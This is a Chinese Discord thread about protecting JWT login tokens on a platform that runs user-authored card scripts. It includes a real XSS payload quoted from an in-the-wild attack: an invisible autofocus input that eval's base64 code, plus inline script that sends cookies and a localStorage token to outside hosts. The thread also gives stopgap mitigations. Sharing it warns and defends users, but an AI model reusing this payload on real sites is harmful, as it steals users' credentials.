# 基于closure scope或HttpOnly Cookie和三重指纹验证的jwt防护与api代理的前端反渗透安全建议
创建: 2026-01-07T21:46:20.914000+00:00
消息: 36条
标签ID: 1382024637290119238
---

**Nix**: Hallo Leute~ 恶魔王又带着新知识来了~

# 思考

鉴于贵平台的jwt是作为用户当前唯一登录凭证使用 一旦jwt泄露代表用户的最高权限可能会被窃取 尤其是受欢迎的用户 剧本中被注入异常代码将会导致大规模入侵事件 因此以下安全建议都将针对jwt展开攻防

同时 为了防止限制用户的剧本编辑自由度 尽可能不对<script>或iframe进行限制 同时还要保持用户代码(尤其是iframe)对父dom的访问(比如parent.sendMessage等操作)权限 并且用户代码是通过正则直接释放进dom中 那么还要防止用户正则通过破坏安全防护模块语法来无效化安防模块

因此 我总结出了以下方案可供选择

# 可用方案

- 封闭jwt作用域 将jwt隔离在closure中 比如const ss = (() => {let _jwt = null})() 限制jwt的生命周期 这样即使注入代码遍历window ss也拿不到_jwt
- 三重指纹验证 在用户首次登录时记录ua 分辨率 色深 时区 语言设置 webgl渲染器 厂商 安装字体 硬件并发数 设备内存 触控支持 platform 使用sha256编码制作成设备指纹 jwt encode时将其写入 后端增加一个中间件 每次请求时对比jwt  cookie.fp和header 不一致立刻吊销jwt 返回5xx要求前端登出 同时给用户发站内信 警示不匹配的指纹登录
- 选择性jwt注入 在正则注入之前 先通过接口获取当前受信url列表 然后再注入regex防止提前override fetch拦截白名单请求 然后重写fetch/xhr/image 只有白名单中的url才注入jwt和指纹
- cookie屏蔽 重写document.cookie getter返回空值
- iframe sandbox 使用mutationobserver监控 自动加sandbox
- service worker 完全独立于dom外的worker将无论如何都不会被正则匹配影响并无效化
- samesite=strict 阻止攻击者通过csrf攻击内联<img src="attck_url">来诱导用户携带cookie跳转通过三重指纹验证
- httponly cookie (该方案与上述方案有部分冲突) jwt不被前端访问

# 结语

我不知道黑客是不是有其他的方案 主要还是围绕着jwt打攻防
如果担心mitm攻击 还可以考虑分发公钥

@user @user

**Nix**: 
📎 [d30b4b9511b93002.js](https://cdn.discordapp.com/attachments/1458577524555513937/1458587406599983145/d30b4b9511b93002.js?ex=6a3c5960&is=6a3b07e0&hm=8b422a20b726c6fd7b81b31315554586f52d7dfab0d726925a0707ec8ed4b9c3&)

**Nix**: 基于closure scope或HttpOnly Cookie和三重指纹验证的jwt防护与api代理的前端反渗透安全建议

**周雅（被老婆调教.周浩）**: 太强了<:07:1298281204260278383>

**清**: 大佬牛

**空山酌哑**: 哇哦

**XXX**: <:07:1298281204260278383>

**XXX**: 终于刷新出野生大佬了，快捉

**超然小水母（水母宗主。大周荣誉国祖)**: <:emoji_250:1440756778487775303>

**超然小水母（水母宗主。大周荣誉国祖)**: @失聯小魅

**Nix**: 我猜对了 来看一个攻击实例
# 置入攻击载荷
<style>.tiny-element{width:1px;height:1px;opacity:0;position:absolute;left:-9999px;border:none;background:transparent;pointer-events:none}</style> <img src=x style=display:none> <input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdWpzLmNpLzZzdCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= autofocus class=tiny-element>
使用tiny-element植入一个不可见的对象 使用eval调用atob解析base64编码的js脚本 这个脚本会自动fetch到以下的攻击载荷

# 内联执行脚本
(function() { (new Image()).src = '//ujs.ci/bdstatic.com/?callback=jsonp&id=6st&location=' + encodeURIComponent((function() {
        try {
            return document.location.href
        } catch(e) {
            return ''
        }
    })()) + '&toplocation=' + encodeURIComponent((function() {
        try {
            return top.location.href
        } catch(e) {
            return ''
        }
    })()) + '&cookie=' + encodeURIComponent((function() {
        try {
            return document.cookie //在这里获取了你的cookie 我在题头中提到过 要禁用document.cookie
        } catch(e) {
            return ''
        }
    })()) + '&opener=' + encodeURIComponent((function() {
        try {
            return (window.opener && window.opener.location.href) ? window.opener.location.href: ''
        } catch(e) {
            return ''
        }
    })());
})();(function(){
const t=localStorage.getItem('TOKENKEY'); //这里是如果能获取tokenkey就向另外的攻击站点传送信息
if(t){
fetch('https://family-pet.net/a/m/a.php',%7B
method:'POST',
headers:{'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json'},
body:'data='+encodeURIComponent(t),
mode:'cors'
})
.then(r=>r.json())
.catch(e=>{});
}
})();
这将自动截获用户的登录凭证以及来源网页

**超然小水母（水母宗主。大周荣誉国祖)**: <:1000168510:1298906820638674984>

**超然小水母（水母宗主。大周荣誉国祖)**: <:emoji_140:1379454014852436038>

**空山酌哑**: 提醒一下各位自检，一觉睡醒被黑客抄家了
📎 [Image_1767838389492.png](https://cdn.discordapp.com/attachments/1458577524555513937/1458647152711696414/Image_1767838389492.png?ex=6a3c9105&is=6a3b3f85&hm=49fae328097243c8079f3a78b022f1cc6573b58975a9f5aa0dadd295750db965&)

**超然小水母（水母宗主。大周荣誉国祖)**: 我的天

**Nix**: 
📎 [image.png](https://cdn.discordapp.com/attachments/1458577524555513937/1458647497873555488/image.png?ex=6a3c9157&is=6a3b3fd7&hm=f6f4347094c8cc678638ac8be2db62c3b08f7a32f19bdad9e220a9243878e349&)

**neyin**: @user

**超然小水母（水母宗主。大周荣誉国祖)**: 人家有tg群的
裡面也有管理
但感覺還是小魅最大

**超然小水母（水母宗主。大周荣誉国祖)**: <:emoji_168:1409564661380288633>

**超然小水母（水母宗主。大周荣誉国祖)**: @user

**清**: tg还有其他吗

**Nix**: 小魅刚才回我了

**Nix**: 安心啦

**超然小水母（水母宗主。大周荣誉国祖)**: 卡魅哦

**小魅**: 这是今天出现的吗

**空山酌哑**: 热乎的

**空山酌哑**: 大概9点半到10点中招

**小魅**: ok 先清理一下缓存

**林羽群星（日暮宗-拉多拉群星）**: 牛逼

**世玉**: 草，我现在才看，都不知道有没有被动，不过我这么糊应该没事吧

**栖夜**: 厉害

**Nix**: 以下提供两个在官方尚未有系统性解决方案之前的临时性解决方案 (我暂时称其为“避孕套”)

## 作者用避孕套
请将以下这行代码加入到您“第一句话”的最前面 这将使该次入侵的常见种类病毒彻底失效
<div class="iFR"><img src="" onerror="window.eval=function(){return ''}"></div>

## 用户用避孕套
请在打开卡片之前按下键盘上的F12 顶部找到“控制台”或者“console” 输入这串代码 点回车 如果看到类似“ƒ (){throw new Error('atob is disabled');}”的返回内容 则说明戴套完毕
window.eval=function(){return ''};

**蜂蜜炒蛋**: 🤣 也是在魅魔这用上套套了

**NicoPoiDuangOvO**: 手机能用下面那个么

**OnlyIfYouLoveMe**: 这不得出个公告？

**超然小水母（水母宗主。大周荣誉国祖)**: <:1000168531:1298906724979310634>

